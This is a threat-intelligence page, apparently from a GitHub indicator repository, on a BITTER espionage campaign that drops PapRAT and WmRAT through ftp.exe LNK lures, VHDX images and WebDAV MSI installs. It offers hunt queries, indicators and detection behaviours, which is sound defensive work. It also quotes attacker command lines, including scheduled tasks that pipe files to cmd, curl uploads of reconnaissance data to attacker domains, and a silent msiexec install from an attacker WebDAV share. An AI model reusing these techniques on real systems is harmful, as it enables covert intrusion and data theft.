# BITTER PapRAT and WmRAT: ftp.exe, VHDX and WebDAV MSI Espionage Chains

[Live entry](https://iocwatch.com/t/BITTER-PapRAT-WmRAT-South-Asia-Espionage/) · [Back to index](../../../../README.md) · [November 2026](../../README.md) · [2026-11-12](../README.md)

| Published | First added | Last updated | Category | Indicators | Block now |
|---|---|---|---|---|---|
| 2026-11-02 | 2026-11-12 18:20 | 2026-11-12 | Nation-state / espionage | 18 | 18 |

## Hunt

Run one of these before blocking to find past activity. Each file is the same hunt written for a different platform; pick the one for your SIEM or XDR.

| File | Platform | How to run it |
|---|---|---|
| [`hunt.kql`](hunt.kql) | Microsoft Defender XDR | In the [Defender portal](https://security.microsoft.com), open **Hunting > Advanced hunting**, paste the query and select **Run query**. It covers the last 30 days. |
| [`hunt.spl`](hunt.spl) | Splunk | In **Search & Reporting**, set the time picker to the last 30 days or more, paste the search and run it. It reads the CIM data models. |
| [`hunt_raw.spl`](hunt_raw.spl) | Splunk without CIM | The same hunt over raw events. Define the `rti_*` macros from [`splunk_macros.conf`](../../../../all/splunk_macros.conf) first. |
| [`hunt.yaral`](hunt.yaral) | Google SecOps | In **Detection > Rules & Detections > Rules Editor**, paste the rule, run a Retrohunt over the last 30 days, then turn on live mode. |

Leads that are not network or hash indicators are in [`iocs.csv`](iocs.csv), and behaviours with no clean field mapping are in the Behaviours section below. Guides: [Defender XDR](../../../../docs/defender-xdr.md), [Splunk](../../../../docs/splunk.md), [Google SecOps](../../../../docs/google-secops.md).

## Summary

FortiGuard Labs attributes with high confidence to BITTER, a suspected South Asian espionage group active since 2013 that targets government, energy and engineering organisations, a campaign against South Asian organisations built on three infection chains and a new remote access trojan, PapRAT. In chain 1, a LNK lure runs the native ftp.exe, whose ! prefix pipes res.ico to cmd; the script creates scheduled tasks such as MicrosoftUpdates\updates11678 and BiosUpdates\update101 that run 'conhost --headless cmd /c more <file>|cmd' on files in C:\users\public\music\err.log or C:\programdata\talk.log, refreshed with curl from goodnfortunes.com and techtalkhelp.com, uploads a reconnaissance file to goodnfortunes.com/ucl.php and shows a fake 'Explorer was unable to open this file!' message. In chain 2, a VHDX image holds a LNK that runs 'cmd.exe /c Visa_Details.msi & Attachment-2.xls', and the MSI's only action is a Type 194 custom action that drops PapRAT disguised as bruzsvc.exe ('Microsoft redistributables'). In chain 3, Invitation 2026.url opens a WebDAV share on rappellingaart.com and the next stage runs 'msiexec /i \\rappellingaart.com@SSL\secure-docs\Imp_Details.msi /qn'. PapRAT, in C++ and Rust builds, polls rivingtonclarks.com or chestergreenfarming.com over HTTP and downloaded WmRAT (vnces.exe), which talks to netmansrvdns.com. All eight domains, five URLs and five hashes are on the block list.

> [!WARNING]
> The victims FortiGuard Labs saw are concentrated in South Asia, but the lures and LOLBin chains work against any Windows estate. The ftp.exe and conhost --headless behaviours are strong leads; MSI installs from WebDAV can occur in some software-distribution setups, so baseline them first.

## Affected countries and sectors

- **Countries:** Not stated in the sources
- **Regions:** South Asia
- **Sectors:** Not stated in the sources
- **Note:** FortiGuard Labs says the campaign targeted South Asian organisations and C2 telemetry is concentrated in South Asia; it names no specific countries or sectors for this campaign.
- **Source:** [FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)

## At a glance

| File | What it is |
|---|---|
| [`block_now.txt`](https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-12/BITTER-PapRAT-WmRAT-South-Asia-Espionage/block_now.txt) (raw) | 18 high-confidence indicators to block now |
| [`iocs.csv`](iocs.csv) | All 18 indicators with description, confidence, action and source |
| [`defender_xdr_indicators.csv`](defender_xdr_indicators.csv) | 18 rows for Defender XDR bulk import |
| [`hunt.kql`](hunt.kql) | Defender XDR advanced hunting query |
| [`hunt.spl`](hunt.spl) | Splunk hunt over the CIM data models |
| [`hunt_raw.spl`](hunt_raw.spl) | Splunk hunt for data not mapped to CIM ([macros](../../../../all/splunk_macros.conf)) |
| [`hunt.yaral`](hunt.yaral) | Google SecOps YARA-L 2.0 detection rule |

Indicators by type: 8 domains, 5 URLs, 5 SHA256. See `iocs.csv` for full details and descriptions.

## MITRE ATT&CK

| ID | Technique |
|---|---|
| [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | Spearphishing Attachment |
| [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | Malicious File |
| [T1553.005](https://attack.mitre.org/techniques/T1553/005/) | Mark-of-the-Web Bypass |
| [T1202](https://attack.mitre.org/techniques/T1202/) | Indirect Command Execution |
| [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task |
| [T1218.007](https://attack.mitre.org/techniques/T1218/007/) | Msiexec |
| [T1036.005](https://attack.mitre.org/techniques/T1036/005/) | Match Legitimate Name or Location |
| [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer |
| [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Web Protocols |
| [T1082](https://attack.mitre.org/techniques/T1082/) | System Information Discovery |
| [T1518.001](https://attack.mitre.org/techniques/T1518/001/) | Security Software Discovery |
| [T1113](https://attack.mitre.org/techniques/T1113/) | Screen Capture |
| [T1041](https://attack.mitre.org/techniques/T1041/) | Exfiltration Over C2 Channel |

## Recommended actions

1. Block the eight BITTER domains, five URLs and five hashes (they are in the Defender XDR import file) and search 90 days of DNS and proxy logs for them.
2. Hunt for ftp.exe launched by explorer.exe or a LNK that spawns cmd.exe, and for scheduled tasks named MicrosoftUpdates\updates* or BiosUpdates\update* that run 'conhost --headless cmd /c more ...|cmd'.
3. Alert on msiexec installing a package from a UNC path containing @SSL (WebDAV), and on files named bruzsvc.exe or vnces.exe or curl writing to C:\users\public\music\err.log or C:\programdata\talk.log.
4. Block or quarantine VHDX, VHD and .url attachments at the mail gateway; if a host is confirmed, isolate it, delete the scheduled tasks and rotate the user's credentials.

## Behaviours to hunt

> Behaviours are leads, not confirmed indicators, and can match legitimate activity. Compare any hit against your own baseline and environment before acting.

1. **Alert** · ftp.exe spawning cmd, then a scheduled task\
   Look for: ftp.exe launched from a LNK (parent explorer.exe or cmd.exe) that then spawns cmd.exe, followed within 10 minutes by schtasks /create on the same device\
   Why it matters: In BITTER's chain 1 the LNK runs ftp.exe, whose ! prefix pipes res.ico to cmd ("!more res.ico"), and the script immediately creates a scheduled task. FortiGuard Labs notes this LOLBin chain avoids script-engine monitoring aimed at PowerShell or wscript. ftp.exe is rarely used interactively on modern endpoints, so a child cmd.exe is a strong lead.\
   Log source: EDR process events (DeviceProcessEvents), Windows Security 4688 with command line, Sysmon 1\
   Source: [Fortinet](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)

2. **Alert** · Fake update tasks piping a log file to cmd\
   Look for: Scheduled tasks named MicrosoftUpdates\updates<digits> or BiosUpdates\update<digits> that run conhost --headless cmd /c more <file>\|cmd\
   Why it matters: FortiGuard Labs shows tasks MicrosoftUpdates\updates11678, MicrosoftUpdates\updates88679 and BiosUpdates\update101 that re-read C:\users\public\music\err.log or C:\programdata\talk.log every 15 to 49 minutes and pipe the content to cmd, so commands change server-side without a new binary. Task names change between victims; the conhost --headless ... more ...\|cmd pattern is the steadier signal.\
   Log source: EDR process events, Windows Security 4698 (scheduled task created), Task Scheduler operational log\
   Source: [Fortinet](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)

3. **Hunt** · curl fetching commands into fake log files\
   Look for: curl writing to C:\users\public\music\err.log or C:\programdata\talk.log, or posting a file with -F file=@ to a ucl.php endpoint\
   Why it matters: The BITTER scripts fetch commands with curl --ssl-no-revoke -k into these fake log files and upload a reconnaissance file (abc.pdf with directory listings, tasklist, antivirus products and drives) with curl -X POST -F to ucl.php.\
   Log source: EDR process and file events, proxy logs\
   Source: [Fortinet](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)

4. **Alert** · msiexec installing an MSI over WebDAV (@SSL)\
   Look for: msiexec /i installing a package from a WebDAV UNC path containing @SSL (for example \\host@SSL\secure-docs\Imp_Details.msi /qn)\
   Why it matters: In chain 3 an Internet Shortcut (Invitation 2026.url) opens a WebDAV share and the next script installs the PapRAT MSI silently straight from it, so mail and browser attachment controls never see the MSI.\
   Log source: EDR process events, Windows Security 4688, WebClient/WebDAV network logs\
   Source: [Fortinet](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)

5. **Hunt** · VHDX LNK running an MSI with a decoy spreadsheet\
   Look for: A LNK launched from a mounted VHDX that runs cmd.exe /c <name>.msi & <name>.xls, installing an MSI and opening a decoy spreadsheet at the same time\
   Why it matters: Chain 2 hides Visa_Details.msi and Attachment-2.xls beside a single visible LNK in "Letter from the Ambassador - 11th Belt and Road Summit.vhdx"; the MSI's only action is a Type 194 custom action that drops PapRAT as bruzsvc.exe.\
   Log source: EDR process events, Windows Security 4688\
   Source: [Fortinet](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)

Behaviours that map cleanly to log fields are included in [`hunt.kql`](hunt.kql) and [`hunt.spl`](hunt.spl), and alert behaviours in [`hunt.yaral`](hunt.yaral). The rest are listed in the Behaviours section above with where to look. Use behaviours to hunt and alert, never to block.

## Sources

- [FortiGuard Labs – BITTER Expands Its Arsenal with PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [ThreatFox – rappellingaart.com payload delivery (IOC 1943932)](https://threatfox.abuse.ch/ioc/1943932/)
- [The Hacker News – Bitter Hackers Deploy New PapRAT Backdoor in Cyberespionage Campaign Targeting South Asia](https://thehackernews.com/2026/11/bitter-hackers-deploy-new-paprat.html)

---

[Back to index](../../../../README.md)
